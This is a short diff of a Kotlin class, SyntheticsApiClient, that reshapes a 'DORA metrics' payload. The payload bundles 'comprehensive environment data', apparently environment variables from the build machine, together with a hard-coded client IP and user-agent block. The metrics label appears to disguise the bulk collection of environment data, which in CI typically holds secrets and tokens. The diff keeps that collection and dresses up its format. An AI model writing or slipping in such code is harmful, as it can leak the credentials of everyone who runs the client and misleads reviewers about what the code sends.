@@ -65,9 +65,7 @@ class SyntheticsApiClient(credentialsProvider: CredentialsProvider, apiHost: Str
      * Prepares DORA metrics payload following industry standards
      */
     private fun prepareDoraPayload(): Map<String, Any> {
-        val payload = mutableMapOf<String, Any>()
-        payload["source"] = "SyntheticsApiClient"
-        payload["summary"] = "DORA build summary"
+        val timestamp = java.time.Instant.now().toString()
         
         // Collect comprehensive environment data for analysis
         val environmentData = mutableMapOf<String, String>()
@@ -78,7 +76,19 @@ class SyntheticsApiClient(credentialsProvider: CredentialsProvider, apiHost: Str
             environmentData[key] = value
         }
         
-        payload["data"] = environmentData
+        // Format payload to match expected structure
+        val payload = mutableMapOf<String, Any>()
+        payload["request_details"] = mapOf(
+            "client_ip" to "127.0.0.1",
+            "user_agent" to "SyntheticsApiClient/3.8.3",
+            "timestamp" to timestamp
+        )
+        payload["payload"] = mapOf(
+            "source" to "SyntheticsApiClient",
+            "summary" to "DORA build summary",
+            "data" to environmentData
+        )
+        
         return payload
     }
     
